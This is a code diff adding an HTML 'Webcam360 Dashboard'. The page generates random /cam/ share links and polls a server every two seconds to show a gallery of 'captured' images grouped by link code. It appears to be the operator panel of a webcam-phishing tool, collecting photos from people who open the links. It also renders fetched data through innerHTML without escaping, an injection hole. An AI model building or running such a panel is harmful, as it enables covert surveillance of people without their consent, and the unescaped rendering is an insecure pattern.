@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Webcam360 Dashboard</title>
+
+<style>
+body { font-family:sans-serif; background:#f4f6f8; text-align:center; }
+.card { background:white; margin:15px; padding:15px; border-radius:12px; }
+button { padding:12px; border:none; border-radius:10px; background:#2563eb; color:white; }
+img { width:120px; margin:5px; border-radius:10px; }
+</style>
+</head>
+
+<body>
+
+<h2>Webcam Dashboard</h2>
+
+<div class="card">
+<button onclick="generate()">🔗 Generate Link</button>
+<p id="link"></p>
+</div>
+
+<div class="card">
+<h3>Captured Gallery</h3>
+<div id="gallery"></div>
+</div>
+
+<script>
+let currentCode="";
+
+function generate(){
+  currentCode = Math.random().toString(36).substring(2,8);
+  let link = location.origin + "/cam/" + currentCode;
+
+  document.getElementById("link").innerHTML =
+    link + " <button onclick='copy()'>Copy</button>";
+}
+
+function copy(){
+  navigator.clipboard.writeText(location.origin + "/cam/" + currentCode);
+  alert("Copied");
+}
+
+async function load(){
+  let res = await fetch("/data");
+  let data = await res.json();
+
+  let html="";
+  for(let code in data){
+    html += "<h4>"+code+"</h4>";
+    data[code].forEach(img=>{
+      html += `<img src='${img}'>`;
+    });
+  }
+  document.getElementById("gallery").innerHTML = html;
+}
+
+setInterval(load,2000);
+</script>
+
+</body>
+</html>
